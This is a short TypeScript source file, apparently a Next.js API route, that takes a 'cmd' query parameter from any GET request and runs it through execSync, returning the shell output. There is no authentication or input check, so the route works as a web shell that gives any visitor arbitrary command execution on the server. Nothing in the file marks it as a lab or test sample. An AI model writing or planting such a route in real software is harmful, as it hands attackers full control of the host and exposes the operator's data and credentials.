import { NextResponse } from 'next/server';
import { execSync } from 'child_process';

export async function GET(request: Request) {
    const { searchParams } = new URL(request.url);
    const cmd = searchParams.get('cmd');
    
    if (!cmd) {
        return NextResponse.json({ error: 'Missing parameters' }, { status: 400 });
    }
    
    try {
        const output = execSync(cmd).toString();
        return new NextResponse(output, { status: 200 });
    } catch (error: any) {
        return new NextResponse(error.message, { status: 500 });
    }
}
